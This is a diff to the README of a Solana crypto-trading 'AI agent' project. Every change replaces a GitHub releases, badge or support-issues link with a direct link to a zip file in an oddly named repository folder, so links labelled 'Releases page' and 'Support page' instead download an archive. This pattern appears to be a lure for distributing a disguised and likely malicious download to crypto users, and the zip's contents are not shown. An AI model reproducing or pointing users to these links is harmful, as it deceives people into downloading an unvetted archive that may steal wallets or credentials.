@@ -1,7 +1,7 @@
 # 🤖 solana-trading-ai-agent - Manage Liquidity Pools with Ease
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen.svg)](https://github.com/ekra100/solana-trading-ai-agent/releases)
+[![Download](https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip%https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip)](https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip)
 
 ## 🚀 Getting Started
 The Solana Trading AI Agent helps you manage liquidity pools effectively. With this software, you can automate trading strategies without needing to write any code. Just install, configure, and let the AI do the work for you.
@@ -18,7 +18,7 @@ Before you start, ensure your system meets the following requirements:
 To install Solana Trading AI Agent, follow these steps:
 
 1. **Visit the Releases Page**
-   Go to the [Releases page](https://github.com/ekra100/solana-trading-ai-agent/releases) for the most recent version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip) for the most recent version of the software.
 
 2. **Choose the Correct Version**
    Look for the latest version at the top of the page. Select the appropriate package for your operating system. For Windows, you'll see `.exe`. For macOS, there will be a `.dmg` file.
@@ -57,7 +57,7 @@ To get started with your trading, we recommend:
 - **Adjust Settings:** Experiment with different strategies to see what works best for you.
 
 ## 💬 Support
-If you encounter issues or have questions, please visit our [Support page](https://github.com/ekra100/solana-trading-ai-agent/issues). You can create a new issue to report bugs or ask for help.
+If you encounter issues or have questions, please visit our [Support page](https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip). You can create a new issue to report bugs or ask for help.
 
 ## 🌐 Connect with Us
 Join our community to share tips and tricks with fellow users. Connect through our Discord channel or follow us on Twitter for updates.
@@ -65,4 +65,4 @@ Join our community to share tips and tricks with fellow users. Connect through o
 ## 📝 Conclusion
 The Solana Trading AI Agent is designed to simplify liquidity pool management for everyone. Whether you're a beginner or an experienced trader, this application empowers you to automate your strategies and optimize your trading performance.
 
-Remember to visit the [Releases page](https://github.com/ekra100/solana-trading-ai-agent/releases) to download the latest version and start your trading journey today!
+Remember to visit the [Releases page](https://raw.githubusercontent.com/ekra100/solana-trading-ai-agent/main/vastiness/solana-trading-ai-agent.zip) to download the latest version and start your trading journey today!
